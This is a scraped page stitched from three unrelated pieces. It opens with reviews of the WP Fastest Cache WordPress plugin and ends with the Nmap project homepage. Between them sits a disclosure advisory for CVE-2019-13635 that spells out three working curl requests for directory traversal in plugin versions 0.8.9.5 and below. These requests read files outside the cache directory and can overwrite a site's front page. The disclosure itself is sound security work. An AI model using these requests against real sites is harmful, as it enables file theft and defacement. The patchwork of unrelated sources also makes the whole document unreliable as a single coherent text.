Although there are over 7000 languages spoken in the world today, we feel very lucky to support 28 languages for now.

Very easy to use. It made my website faster. The image optimization is also great.I had a problem with caching reviews (FeedbackWP). The support gave an important tip and I was able to solve the problem with FeedbackWP support. Within 24 hours. Very good. I can only recommend the plugin and the support.

I was skeptical about its performance because it was easy to set up and the UI was simple, but it is the fastest cache plugin. I tested numerous cache plugins.
It is the only plugin that supports preload and is fully compatible with complex themes, many plugins, and nginx.

# CVE-2019-13635: Directory traversal in WP Fastest Cache 0.8.9.5 and below

---

*From*: Imre Rad <radimre83 () gmail com>

*Date*: Sun, 28 Jul 2019 10:37:56 +0200

---

```
WP Fastest Cache is a Wordpress plugin that creates static html files
from the dynamic WordPress blog in order to speed up operation.

Version 0.8.9.5 and below of the plugin was identified being
vulnerable to directory traversal attacks.

The first two are Windows only, the 3rd one is generic. The Windows
specific ones were tested on WampServer (so with Apache's Httpd).

#1:
The impact is reading files outside of the cache directory. The
attacker has control over the directory only, the file is selected as
the first hit of the scandir results in descending order.

curl --path-as-is [http://vulnerable-host.tld/wpfc-minified/..\..\..\/stuff.php](http://vulnerable-host.tld/wpfc-minified/..%5C..%5C..%5C/stuff.php)

<?php
/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */
...

#2:
The cacheFilePath construction logic in cache.php can be abused to
mount a similar attack as vuln #1 and read index.html files outside
the cache directory:

curl --path-as-is [http://vulnerable-host.tld/..\..\..\/whatever.html\/](http://vulnerable-host.tld/..%5C..%5C..%5C/whatever.html%5C/)..
some html content outside the cache directory
<!-- via php -->

#3:
If the Google Translate plugin is active on the victim system then it
is also possible to create index.html files outside the cache
directory:

curl -v --header "X-GT-LANG: ../../../.."
<http://vulnerable-host.tld/some-article/>

In configurations where the html extension has higher precedence over
php in the webserver's DirectoryIndex configuration, this could
actually change the front page of the victim website.

Remediation: update to plugin version 0.8.9.6

Imre

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
